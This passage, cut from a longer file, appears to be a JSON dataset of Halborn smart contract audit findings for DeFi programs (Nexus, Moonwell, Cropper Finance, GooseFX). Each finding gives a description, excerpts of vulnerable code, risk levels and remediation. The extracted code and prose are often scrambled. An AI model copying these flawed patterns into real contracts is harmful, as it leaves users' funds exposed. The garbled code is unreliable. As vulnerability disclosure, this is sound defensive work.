        "body": "function contracts/ calculate_global_index The which nasset_token_rewards/src/commands.rs index This is then used to calculate the rewards distributed to users. function is indirectly available from the update_global_index function which can be called by sending an anonymous UpdateGlobalIndex message to the handler in contracts/nasset_token_rewards/src/contract.rs. determines defined the in global_index nasset_token_rewards This contract the claim_rewards_for_someone functions. can manipulated with be by sending rewards the claim_rewards to and Code Location: Listing 75,89,90,91,92) 15: contracts/nasset_token_rewards/src/commands.rs (Lines 69 fn calculate_global_index ( deps : Deps , 70 env : Env , 71 config : & Config , 72 73 state : & mut State , 74 ) -> ContractResult < Uint128 > { 75 let balance = query_token_balance ( deps , & config . psi_token , & env . contract . address ) ?; let previous_balance = state . prev_reward_balance ; // claimed_rewards = current_balance - prev_balance ; let claimed_rewards = balance . checked_sub ( previous_balance ) ?; if claimed_rewards . is_zero () || state . total_balance . is_zero () { return Ok ( claimed_rewards ); } 76 77 78 79 80 81 82 83 84 35 85 86 87 88 89 90 91 92 93 94 95 } state . prev_reward_balance = balance ; // global_index += claimed_rewards / total_balance ; state . global_index = decimal_summation_in_256 ( state . global_index , Decimal :: from_ratio ( claimed_rewards , state . total_balance ) , ); Ok ( claimed_rewards ) Listing 16: contracts/nasset_token_rewards/src/commands.rs (Lines 51) 41 pub fn update_global_index ( deps : DepsMut , env : Env ) -> 42 43 44 45 46 47 48 49 50 51 ContractResult < Response > { let mut state : State = load_state ( deps . storage ) ?; // Zero nasset balance check if state . total_balance . is_zero () { return Err ( StdError :: generic_err (\" nAsset balance is zero \" ) . into () ); } let config = load_config ( deps . storage ) ?; let claimed_rewards = calculate_global_index ( deps . as_ref () , env , & config , & mut state ) ?; Listing 17: contracts/nasset_token_rewards/src/contract.rs (Lines 52) deps : DepsMut , env : Env , info : MessageInfo , msg : ExecuteMsg , 43 #[ entry_point ] 44 pub fn execute ( 45 46 47 48 49 ) -> ContractResult < Response > { 50 51 52 match msg { ExecuteMsg :: Anyone { anyone_msg } => match anyone_msg { AnyoneMsg :: UpdateGlobalIndex {} = > commands :: update_global_index ( deps , env ) , 36 Risk Level: Likelihood - 1 Impact - 2 Recommendations: Both claim_rewards and claim_rewards_for_someone should block sending PSI tokens to the nasset_token_reward contract in order to prevent global index manipulation. Remediation plan:: ACKNOWLEDGED: the Nexus team acknowledged this finding. global_index manipulation could incur losses to the attacker which makes this vulner- ability less likely to be exploited. 37 3.10 (HAL-10) INSUFFICIENT MARKETING DATA VALIDATION - INFORMATIONAL ",
        "labels": [
            "Halborn",
            "Nexus_Protocol_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "OVERPRIVILEGED ROLE ON THE BREAK GLASS GUARDIAN",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Governance_and_Timelock_Updates_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the contract GovernorAlpha, the breakGlassGuardian has the authority to call the following functions to update the timelock admin:  GovernorAlpha.__acceptAdminOnTimelock() : The breakGlassGuardian can accept address to be a timelock admin.  GovernorAlpha.__executeSetTimelockPendingAdmin(address) breakGlassGuardian can add a pending admin. : The Any compromise to the breakGlassGuardian account may allow the hacker to tamper with the project through these functions. Code Location: Listing 1: GovernorAlpha.sol require ( msg . sender == breakGlassGuardian , \" GovernorAlpha :: // / @notice Fast tracks setting a pendingAdmin on the timelock } timelock . acceptAdmin () ; function __acceptAdminOnTimelock () public { 1 2  __acceptAdmin : sender must be bg guardian \" ); 3 4 5 6  . Only callable by the break glass guardian . 7  newPendingAdmin ) public { 8  __executeSetTimelockPendingAdmin : sender must be bg guardian \"); 9  \" setPendingAdmin ( address ) \" , abi . encode ( newPendingAdmin )) ; 10 function __executeSetTimelockPendingAdmin ( address } require ( msg . sender == breakGlassGuardian , \" GovernorAlpha :: timelock . fastTrackExecuteTransaction ( address ( timelock ) , 0, 12 Risk Level: Likelihood - 2 Impact - 4 Recommendation: It is recommended to remove one of the functions and carefully manage the private key of the breakGlassGuardian account to avoid any potential hacking risk. In general, it is strongly recommended enhancing central- ized privileges or roles in the protocol through a decentralized mechanism or smart contract-based accounts with enhanced security practices, e.g., Multi-signature wallets. Remediation Plan: SOLVED: The Moonwell Team solved this issue by removing the **__execute- SetTimelockPendingAdmin** function. Commit ID: 4e8bec5926339106c225d0f85120ba182e52f2dd 13 ",
        "labels": [
            "Halborn",
            "Moonwell_Finance_Governance_and_Timelock_Updates",
            "Severity: Medium"
        ]
    },
    {
        "title": "TIMELOCK DELAY IS SET TO ZERO IN THE CONSTRUCTOR",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Governance_and_Timelock_Updates_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The timelock delay is set to zero in the constructor. That can cause inconsistency in the proposals, and each proposal can bypass the timelock. Code Location: Listing 2: Timelock.sol constructor ( address admin_ , uint delay_ ) public { require ( delay_ >= MINIMUM_DELAY , \" Timelock :: constructor : require ( delay_ <= MAXIMUM_DELAY , \" Timelock :: setDelay : 1 2  Delay must exceed minimum delay . \"); 3  Delay must not exceed maximum delay .\" ); 4 5 6 admin = admin_ ; delay = 0; } Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to set a delay in the constructor. Remediation Plan: SOLVED: The Moonwell Team solved this issue by setting the delay function. 14 Commit ID: 4e8bec5926339106c225d0f85120ba182e52f2dd 15 ",
        "labels": [
            "Halborn",
            "Moonwell_Finance_Governance_and_Timelock_Updates",
            "Severity: Medium"
        ]
    },
    {
        "title": "MISSING EVENTS FOR ADMIN ONLY FUNCTIONS THAT CHANGE CRITICAL PARAMETERS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Governance_and_Timelock_Updates_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Role-only privileged functions that change critical parameters should emit events. Events allow changing parameters to be captured so that off-chain tools/interfaces can record such changes with timelocks allowing users to evaluate them and consider whether they would like to engage/exit based on how they perceive the changes to affect reliability of the protocol or profitability of implemented financial services. The alternative of directly querying the state of the on-chain contract for such changes is not considered practical for most users/usages. Code Location: Listing 3: GovernorAlpha.sol function setProposalMaxOperations ( uint newValue ) public { require ( msg . sender == address ( timelock ) , \" only timelock \"); proposalMaxOperations = newValue ; } 1 2 3 4 5 6  place , once proposed 7 8 9 10 11 12 13 14 15 16 17 } // / @notice The delay before voting on a proposal may take uint public votingDelay = 1 days ; function setVotingDelay ( uint newValue ) public { require ( msg . sender == address ( timelock ) , \" only timelock \"); votingDelay = newValue ; // / @notice The duration of voting on a proposal , in blocks uint public votingPeriod = 3 days ; function setVotingPeriod ( uint newValue ) public { require ( msg . sender == address ( timelock ) , \" only timelock \"); 16 18 19 } votingPeriod = newValue ; Risk Level: Likelihood - 1 Impact - 1 Recommendation: Add events to all admin/privileged functions that change critical param- eters. Remediation Plan: SOLVED: The Moonwell Team solved this issue by adding events to functions. Commit ID: 4e8bec5926339106c225d0f85120ba182e52f2dd 17 ",
        "labels": [
            "Halborn",
            "Moonwell_Finance_Governance_and_Timelock_Updates",
            "Severity: Informational"
        ]
    },
    {
        "title": "PLACE VARIABLE DEFINITION AT THE BEGINNING OF THE CONTRACT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Governance_and_Timelock_Updates_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Regarding Solidity Style Guide, the variable definition can be moved to the beginning of the contract. Code Location: Listing 4: GovernorAlpha.sol function setProposalMaxOperations ( uint newValue ) public { require ( msg . sender == address ( timelock ) , \" only timelock \"); proposalMaxOperations = newValue ; } 1 2 3 4 5 6  place , once proposed 7 8 9 10 11 12 13 14 15 16 17 18 19 } } // / @notice The delay before voting on a proposal may take uint public votingDelay = 1 days ; function setVotingDelay ( uint newValue ) public { require ( msg . sender == address ( timelock ) , \" only timelock \"); votingDelay = newValue ; // / @notice The duration of voting on a proposal , in blocks uint public votingPeriod = 3 days ; function setVotingPeriod ( uint newValue ) public { require ( msg . sender == address ( timelock ) , \" only timelock \"); votingPeriod = newValue ; Risk Level: Likelihood - 1 Impact - 1 18 Recommendation: Consider moving the variable definition to the beginning of the contract. Remediation Plan: SOLVED: The Moonwell Team solved this issue by placing variables at the beginning of the contract. Commit ID: 4e8bec5926339106c225d0f85120ba182e52f2dd 19 ",
        "labels": [
            "Halborn",
            "Moonwell_Finance_Governance_and_Timelock_Updates",
            "Severity: Informational"
        ]
    },
    {
        "title": "CHANGING FUNCTION VISIBILITY FROM PUBLIC TO EXTERNAL",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Governance_and_Timelock_Updates_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "There are the functions declared as public that are never called internally It is good practice to mark such functions as within the contract. external, as this saves gas (especially in the case where the function takes arguments, since external functions can read arguments directly from calldata instead of having to allocate memory). Code Location: Listing 5: GovernorAlpha.sol function setProposalMaxOperations ( uint newValue ) public { require ( msg . sender == address ( timelock ) , \" only timelock \"); proposalMaxOperations = newValue ; } 1 2 3 4 5 6  place , once proposed 7 8 9 10 11 12 13 14 15 16 17 18 19 } } // / @notice The delay before voting on a proposal may take uint public votingDelay = 1 days ; function setVotingDelay ( uint newValue ) public { require ( msg . sender == address ( timelock ) , \" only timelock \"); votingDelay = newValue ; // / @notice The duration of voting on a proposal , in blocks uint public votingPeriod = 3 days ; function setVotingPeriod ( uint newValue ) public { require ( msg . sender == address ( timelock ) , \" only timelock \"); votingPeriod = newValue ; 20 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Functions should be marked as an external for gas optimization. Listing 6 1 public - everyone can access 2 3 external - Cannot be accessed internally , only externally 4 5 internal - only this contract and contracts derived from it can  access 6 7 private - can only be accessed from this contract Remediation Plan: SOLVED: The Moonwell Team solved this issue by setting external functions. Commit ID: 4e8bec5926339106c225d0f85120ba182e52f2dd 21 THANK YOU FOR CHOOSING",
        "labels": [
            "Halborn",
            "Moonwell_Finance_Governance_and_Timelock_Updates",
            "Severity: Informational"
        ]
    },
    {
        "title": "HARDCODED GOVERNANCE ADDRESSES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Cropper_Finance_AMM_Program_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Several important governance accounts/wallets addresses are hardcoded in constraints.rs. In case those addresses are compromised the program owner has no way of updating them thus putting users funds at risk. Code Location: Listing 1: constraints.rs (Lines 59) 58 #[ cfg ( feature = \" production \") ] 59 const OWNER_KEY : & str = env! ( \" SWAP_PROGRAM_OWNER_FEE_ADDRESS \"); Listing 2: constraints.rs (Lines 84) Some ( SwapConstraints { #[ cfg ( feature = \" production \") ] { 80 pub const SWAP_CONSTRAINTS : Option < SwapConstraints > = { 81 82 83 84 85 86 87 88 owner_key : OWNER_KEY , valid_curve_types : VALID_CURVE_TYPES , fees : FEES , }) } Listing 3: processor.rs (Lines 34) 33 use std :: convert :: TryInto ; 34 const FEE_WALLET_ADDRESS :& str = \"2 Pv5mjmKYAtXNpr3mcsXf7HjtS3fieJeFoWPATVT5rWa \" ; 35 const WSOL_MINT_ADDRESS :& str = \" So11111111111111111111111111111111111111112 \" ; 36 // / Program state handler . 37 pub struct Processor {} 13 Risk Level: Likelihood - 1 Impact - 5 Recommendations: Consider making the governance addresses modifiable and implement a func- tion to update these addresses in case they are compromised. Remediation Plan: SOLVED: Fixed in commit 691220b25ac065ca68dfffde9f9e2bac72d3da04. 14 ",
        "labels": [
            "Halborn",
            "Cropper_Finance_AMM_Program",
            "Severity: Medium"
        ]
    },
    {
        "title": "SERUM DEX MARKET ACCOUNT OWNER VALIDATION MISSING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Cropper_Finance_AMM_Program_Security_Audit_Report_Halborn_Final.pdf",
        "body": "One of the accounts the process_initialize function requires is a Serum DEX market ID. The accounts address is one of swap properties, however the owner of this account is not validated to match the Serum DEX program ID. This allows users to initialize a swap with an arbitrary account owned by any program instead of a legitimate Serum DEX market. Code Location: Listing 4: processor.rs (Lines 239) 236 let destination_info = next_account_info ( account_info_iter ) ?; 237 let token_program_info = next_account_info ( account_info_iter ) ?; 238 let dex_program_info = next_account_info ( account_info_iter ) ?; 239 let market_info = next_account_info ( account_info_iter ) ?; 240 241 // validate account info 242 let token_program_id = * token_program_info . key ; 243 if SwapVersion :: is_initialized (& swap_info . data . borrow () ) { 244 245 } return Err ( AmmError :: AlreadyInUse . into () ); Listing 5: processor.rs (Lines 348) 342 // Save the pool account info 343 let obj = SwapVersion :: SwapV1 ( SwapV1 { 344 345 346 347 348 349 is_initialized : true , nonce , amm_id : * amm_id_info . key , dex_program_id : * dex_program_info . key , market_id : * market_info . key , token_program_id , 15 Risk Level: Likelihood - 2 Impact - 2 Recommendations: Validate the supplied market account owner address to match the Serum DEX program ID. Remediation Plan: SOLVED: Fixed in commit 17d66786ce4f9c687cba9212b59773ba688c9c78. 16 ",
        "labels": [
            "Halborn",
            "Cropper_Finance_AMM_Program",
            "Severity: Low"
        ]
    },
    {
        "title": "USE OF UNSAFE CODE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Cropper_Finance_AMM_Program_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Although Rust language programming is memory safe by default, it allows the user to provide the unsafe keyword/feature to apply less restrictions than normal. Using unsafe code is possible to dereferencing a raw pointer, reading or writing a mutable or external static variable, accessing a field of a union other than to assign to it, calling an unsafe function The security consequences of using or implementing an unsafe trait. unsafe code in Rust increase the possibilities to be exposed to several vulnerabilities or bugs provoking memory leaks. The worst cases can expose sensitive information left in memory, or gain remote code execution by taking control of the pointer in memory, and redirecting it to malicious code execution sectors controlled by an attacker. Code Location: Listing 6: amm_instruction (Lines 327) if input . len () < size_of :: < u8 >() + size_of :: <T >() { 314 pub fn unpack <T >( input : &[ u8 ]) -> Result <& T , ProgramError > { 315 316 317 318 319 } #[ allow ( clippy :: cast_ptr_alignment ) ] let val : & T = unsafe { &*(& input [1] as * const u8 as * const T) return Err ( ProgramError :: InvalidAccountData ); }; Ok ( val ) 320 321 } Risk Level: Likelihood - 2 Impact - 2 17 Recommendations: It is recommended not to use unsafe code in order to avoid exposed possible vulnerabilities or bugs triggering memory leaks. Remediation Plan: SOLVED: Fixed in commit 1e9ea9d6716d0314bc6c8465b4b6068944cf73c5. 18 ",
        "labels": [
            "Halborn",
            "Cropper_Finance_AMM_Program",
            "Severity: Low"
        ]
    },
    {
        "title": "BYTE ARRAY LENGTH VALIDATION MISSING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Cropper_Finance_AMM_Program_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The unpack_from_slice functions defined in curve/base.rs, curve/fees.rs , curve/constant_price, curve/offset.rs and curve/stable.rs parse user- supplied byte arrays to struct fields. Neither of those functions however verify if the user-supplied data length matches the expected ones which may lead to panics when the length is incorrect. Code Location: Listing 7: curve/base.rs (Lines 213) let input = array_ref! [ input , 0 , 33]; #[ allow ( clippy :: ptr_offset_with_cast )] let ( curve_type , calculator ) = array_refs! [ input , 1, 32]; let curve_type = curve_type [0]. try_into () ?; Ok ( Self { 209 // / Unpacks a byte buffer into a SwapCurve 210 fn unpack_from_slice ( input : &[ u8 ]) -> Result < Self , ProgramError > { 211 212 213 214 215 216 217 218 219 curve_type , calculator : match curve_type { Box :: new ( ConstantProductCurve :: unpack_from_slice ( CurveType :: ConstantProduct => { calculator ) ?) } CurveType :: ConstantPrice => { Box :: new ( ConstantPriceCurve :: unpack_from_slice ( calculator ) ?) } CurveType :: Stable => Box :: new ( StableCurve :: unpack_from_slice ( calculator ) ?) , CurveType :: Offset => Box :: new ( OffsetCurve :: unpack_from_slice ( calculator ) ?) , 220 221 222 223 224 225 226 227 228 } }, }) 19 Listing 8: fees.rs (Lines 115) let input = array_ref! [ input , 0 , 24]; #[ allow ( clippy :: ptr_offset_with_cast )] let ( 114 fn unpack_from_slice ( input : &[ u8 ]) -> Result < Fees , ProgramError > { 115 116 117 118 119 120 121 return_fee_numerator , fixed_fee_numerator , fee_denominator , ) = array_refs! [ input , 8, 8, 8]; Listing 9: curve/constant_price.rs (Lines 253) 252 fn unpack_from_slice ( input : &[ u8 ]) -> Result < ConstantPriceCurve , ProgramError > { let token_b_price = array_ref! [ input , 0, 8]; Ok ( Self { 253 254 255 256 257 } 258 259 ```{ language = rust caption = \" curve / offset . rs \" firstnumber =174 hlines token_b_price : u64 :: from_le_bytes (* token_b_price ) , }) =175} 260 fn unpack_from_slice ( input : &[ u8 ]) -> Result < OffsetCurve , ProgramError > { let token_b_offset = array_ref! [ input , 0, 8]; Ok ( Self { token_b_offset : u64 :: from_le_bytes (* token_b_offset ) , }) 261 262 263 264 265 } Listing 10: curve/stable.rs (Lines 336) 335 fn unpack_from_slice ( input : &[ u8 ]) -> Result < StableCurve , ProgramError > { let amp = array_ref! [ input , 0, 8]; Ok ( Self { amp : u64 :: from_le_bytes (* amp ) , }) 336 337 338 339 340 } 20 Risk Level: Likelihood - 1 Impact - 2 Recommendations: Validate the user-supplied data length to match the expected ones before parsing it to struct fields. Remediation Plan: SOLVED: Fixed in commit 691220b25ac065ca68dfffde9f9e2bac72d3da04. 21 ",
        "labels": [
            "Halborn",
            "Cropper_Finance_AMM_Program",
            "Severity: Informational"
        ]
    },
    {
        "title": "INITIALISING SWAP WITH FROZEN TOKEN ACCOUNTS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Cropper_Finance_AMM_Program_Security_Audit_Report_Halborn_Final.pdf",
        "body": "To be initialised, the token swap account requires two token accounts to be provided by the initialising user. Both accounts are checked not to have the same mint and belong to the swap authority however they are not verified not to be frozen, therefore it is possible for a malicious user to create a frozen pool with tokens that cannot effectively be accessed. Code Location: Listing 11: processor.rs (Lines 250,251) 250 let token_a = Self :: unpack_token_account ( token_a_info , & token_program_id ) ?; 251 let token_b = Self :: unpack_token_account ( token_b_info , & token_program_id ) ?; 252 253 let destination = Self :: unpack_token_account ( destination_info , & token_program_id ) ?; 254 let pool_mint = Self :: unpack_mint ( pool_mint_info , & token_program_id ) ?; return Err ( AmmError :: InvalidOwner . into () ); 255 if * authority_info . key != token_a . owner { 256 257 } 258 if * authority_info . key != token_b . owner { 259 260 } return Err ( AmmError :: InvalidOwner . into () ); Listing 12: processor.rs (Lines 294,297,300,303) 294 if token_a . delegate . is_some () { 295 296 } return Err ( AmmError :: InvalidDelegate . into () ); 22 return Err ( AmmError :: InvalidDelegate . into () ); 297 if token_b . delegate . is_some () { 298 299 } 300 if token_a . close_authority . is_some () { 301 302 } 303 if token_b . close_authority . is_some () { 304 305 } return Err ( AmmError :: InvalidCloseAuthority . into () ); return Err ( AmmError :: InvalidCloseAuthority . into () ); Risk Level: Likelihood - 1 Impact - 2 Recommendations: Verify if the state property of both token accounts is not Frozen before initializing the swap. Remediation Plan: SOLVED: Fixed in commit 5a00ce89c4a3da6dcfd6ccba123c5e81ee605308. 23 ",
        "labels": [
            "Halborn",
            "Cropper_Finance_AMM_Program",
            "Severity: Informational"
        ]
    },
    {
        "title": "MULTIPLE VULNERABILITIES IN THE FEE VALIDATE METHOD",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Cropper_Finance_AMM_Program_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The Fee::validate method is tasked with verifying if the user-supplied struct fields can be used in swap/withdraw fee calculation. There is a number if issues with that method: 1. Division by zero in the first if statement: it does not ensure the fee_denominator to be greater than 0 which can lead to division by zero if used in fee calculation. 2. Integer overflow in the second if statement: An overflow happens when an arithmetic operation attempts to create a numeric value that is outside of the range that can be represented with a given number of digits. In this statement two u128 values are added together without checking whether the result is within the range that can be represented with a given number of bits. If it isnt, in Rust the resulting value is specified to wrap as twos complement, resulting in a value either too low or too high considering the circumstances. Although this function are not currently exploitable as the values of its arguments are hardcoded, technically it is still vulnerable and we recommend patching it. Code Location: Listing 13: curve/fees.rs (Lines 79,81) 76 // / Validate that the fees are reasonable 77 pub fn validate (& self ) -> Result <() , AmmError > { 78 79 if self . fee_denominator == 0 && self . fixed_fee_numerator == 0 80 && self . return_fee_numerator == 0{ Ok (() ) 24 81 } else if self . fixed_fee_numerator + self . return_fee_numerator >= self . fee_denominator { Err ( AmmError :: InvalidFee ) } else { Ok (() ) } 82 83 84 85 86 } Risk Level: Likelihood - 1 Impact - 1 Recommendations: In the release mode Rust does not panic on overflows and overflown values wrapabout without any explicit feedback to the user. It is recom- mended then to use vetted safe math libraries for arithmetic operations consistently throughout the smart contract system. Consider replacing the addition operator with Rusts checked_add method and validating the denominators to be greater than 0. Remediation: SOLVED: Fixed in commit 6ca7e12c14edcf5fdd9d28f675b9f4b148d4258f. 25 ",
        "labels": [
            "Halborn",
            "Cropper_Finance_AMM_Program",
            "Severity: Informational"
        ]
    },
    {
        "title": "GET PACKED DATA LENGTH FUNCTION RETURNS AMBIGUOUS RESULTS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Cropper_Finance_AMM_Program_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Each swap operation requires the swap account to be initialised. The account has to allocate a sufficient number of bytes for account (packed) data. This number can be determined with the get_packed_len utility function. However, Cropper prepends this data with a single byte denoting the swap version which the get_packed_len function does not consider thus returning a number one too low. Without manually increasing the allocation space by one it is impossible to create a correct account and in consequence it is impossible to create a swap. Code Location: Listing 14: amm_stats.rs (Lines 65) 60 // / Pack a swap into a byte array , based on its version 61 pub fn pack ( src : Self , dst : & mut [ u8 ]) -> Result <() , ProgramError > { match src { Self :: SwapV1 ( swap_info ) => { dst [0] = 1; SwapV1 :: pack ( swap_info , & mut dst [1..]) } } 62 63 64 65 66 67 68 } Listing 15: amm_stats.rs (Lines 206) const LEN : usize = 411; 202 impl Pack for SwapV1 { 203 204 205 206 207 fn pack_into_slice (& self , output : & mut [ u8 ]) { let output = array_mut_ref! [ output , 0, 411]; let ( 26 208 209 210 211 212 is_initialized , nonce , amm_id , dex_program_id , market_id , Risk Level: Likelihood - 1 Impact - 1 Recommendations: Include the byte denoting swap version in the packed data so the SwapV1 ::get_packed_len function returns the correct number of bytes required. Remediation Plan: SOLVED: Fixed in commit 691220b25ac065ca68dfffde9f9e2bac72d3da04. 27 ",
        "labels": [
            "Halborn",
            "Cropper_Finance_AMM_Program",
            "Severity: Informational"
        ]
    },
    {
        "title": "INITIAL POOL LIQUIDITY EDGE CASES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/Cropper_Finance_AMM_Program_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Regardless of the actual deposit amount or selected curve type users are minted 1,000,000,000 LP tokens on swap initialisation as defined by the This has at least INITIAL_SWAP_POOL_AMOUNT constant in calculator.rs. two consequences for all other liquidity providers: 1. It will be impossible for other users to deposit less then k  10n tokens if the initial deposit is made for an amount of k  109+n tokens (k, n  0) and no withdraws are made because the amount of LP tokens to be minted on each subsequent deposit is calculated based on the current LP token balance. 2. if the initial deposit is for an amount of 1 token and no withdraws are made the pool will hold up to 18.5k tokens (assuming 6 decimal places) Code Location: Listing 16: processor.rs (Lines 329,339) 327 swap_curve . calculator . validate () ?; 328 329 let initial_amount = swap_curve . calculator . new_pool_supply () ; 330 331 // Mint Initial supply 332 Self :: token_mint_to ( 333 334 335 336 337 338 339 340 ) ?; swap_info . key , token_program_info . clone () , pool_mint_info . clone () , destination_info . clone () , authority_info . clone () , nonce , to_u64 ( initial_amount )? , 28 Listing 17: calculator.rs (Lines 101) 98 // / Get the supply for a new pool 99 // / The default implementation is a Balancer - style fixed initial supply 100 fn new_pool_supply (& self ) -> u128 { 101 INITIAL_SWAP_POOL_AMOUNT 102 } Listing 18: calculator.rs (Lines 12) 8 // / Initial amount of pool tokens for swap contract , hard - coded to something 9 // / \" sensible \" given a maximum of u128 . 10 // / Note that on Ethereum , Uniswap uses the geometric mean of all provided 11 // / input amounts , and Balancer uses 100 * 10 ^ 18. 12 pub const INITIAL_SWAP_POOL_AMOUNT : u128 = 1 _000_000_000 ; Risk Level: Likelihood - 1 Impact - 1 Recommendations: Document these edge cases so that the community is more aware of the protocol limitations. 29 ",
        "labels": [
            "Halborn",
            "Cropper_Finance_AMM_Program",
            "Severity: Informational"
        ]
    },
    {
        "title": "TOKENS IN FEE VAULTS LOCKED INDEFINITELY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/GooseFX_Swap_Program_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Users pay operational fees to fee_vault accounts for withdrawing liquidity and swapping tokens. On pool initialisation, the fee_vault token account authority is set to the relevant pools account address, a PDA created from the gfx_swap program id, static seed and the pool address. The gfx_swap program does not allow transferring any fees from vaults which means they are locked in these accounts indefinitely. Code Location: Listing 1: contexts/initialize.rs (Lines 22) 11 #[ derive ( Accounts ) ] 12 #[ instruction ( seed : [ u8 ; 32 ] , pool_bump : u8 , lp_bump : u8 )] 13 pub struct Initialize < ' info > { 14 pub admin : AccountInfo <' info >, // admin account can do privileged operations 15 16 17 18 19 20 21 22 23 #[ account ( init , seeds = [ Pool :: IDENT , & seed ] , bump = pool_bump , payer = payer , )] pub pool : Account < ' info , Pool >, Listing 2: cli/src/bin/create_pool.rs (Lines 53) Cluster :: Devnet , CliKeypair :: copy (& admin ) , CommitmentConfig :: confirmed () , 43 let client = Client :: new_with_options ( 44 45 46 47 ); 48 let program = client . program ( program_id ); 12 49 50 // seed for creating the pool 51 let seed = solana_sdk :: signature :: Keypair :: new () . pubkey () ; 52 53 let ( pool , pool_bump ) = Pool :: get_address_with_bump (& program_id , & seed . to_bytes () ); 54 let ( lp_mint , lp_bump ) = LPMint :: get_address_with_bump (& program_id , & seed . to_bytes () ); 55 56 println! ( \" Creating the LP pool ... \" ); 57 Listing 3: cli/src/bin/create_pool.rs (Lines 20) 19 fn get_address_with_bump ( program_id : & Pubkey , seed : &[ u8 ]) -> ( Pubkey , u8 ) { Pubkey :: find_program_address (&[ Self :: IDENT , seed ], program_id ) 20 21 } Risk Level: Likelihood - 5 Impact - 3 Recommendations: Consider implementing either a governance function to allow transferring tokens from pool fee vaults or change fee vault authority accounts to a one with matching private key. Remediation Plan: SOLVED: The GooseFX team fixed the issue in commit fe70730908889551ce653e18f8dd9b0d1ddfd6ee. 13 ",
        "labels": [
            "Halborn",
            "GooseFX_Swap_Program",
            "Severity: High"
        ]
    },
    {
        "title": "POOLS CANNOT BE SUSPENDED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/GooseFX_Swap_Program_Security_Audit_Report_Halborn_Final.pdf",
        "body": "suspended is one of the fields in the Pool struct. If set to true, all operations on a pool are suspended--swapping,depositing and withdrawing are blocked. This field is set to false by default and its value cannot be modified as the program does not feature any instructions that update pool parameters. Code Location: Listing 4: states/pool.rs (Lines 27) 11 #[ account ] 12 #[ derive ( Default , Debug )] 13 pub struct Pool { 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 } pub seed : [ u8 ; 32] , pub bump : u8 , pub lp_bump : u8 , pub admin : Pubkey , // sorted by token mint addresses pub token_mint_1 : Pubkey , pub token_mint_2 : Pubkey , pub token_vault_1 : Pubkey , pub token_vault_2 : Pubkey , pub mint : Pubkey , // the LP token mint pub fee_vault : Pubkey , pub fees : Fees , pub curve : SwapCurve , pub suspended : bool , Listing 5: contexts/initialize.rs 92 let ( token_vault_1 , token_vault_2 ) = 93 ( token_a_vault . mint , token_b_vault . mint ). sort ( token_a_vault , token_b_vault ) ?; 14 94 let ( token_mint_1 , token_mint_2 ) = ( token_a_mint , token_b_mint ). sort_self () ?; 95 96 pool . admin = admin . key () ; 97 pool . seed = seed ; 98 pool . bump = pool_bump ; 99 pool . lp_bump = lp_bump ; 100 pool . token_mint_1 = token_mint_1 . key () ; 101 pool . token_mint_2 = token_mint_2 . key () ; 102 pool . token_vault_1 = token_vault_1 . key () ; 103 pool . token_vault_2 = token_vault_2 . key () ; 104 pool . mint = lp_token_mint . key () ; 105 pool . fee_vault = lp_token_ata_fee . key () ; 106 pool . fees = fees ; 107 pool . curve = curve ; Risk Level: Likelihood - 2 Impact - 4 Recommendations: Implement an instruction handler for updating pool parameters. Remediation Plan: SOLVED: The GooseFX team fixed the issue in commit fe70730908889551ce653e18f8dd9b0d1ddfd6ee. 15 ",
        "labels": [
            "Halborn",
            "GooseFX_Swap_Program",
            "Severity: Medium"
        ]
    },
    {
        "title": "OFFSET CURVE TOKEN MISMATCH",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solana Program Audit/GooseFX_Swap_Program_Security_Audit_Report_Halborn_Final.pdf",
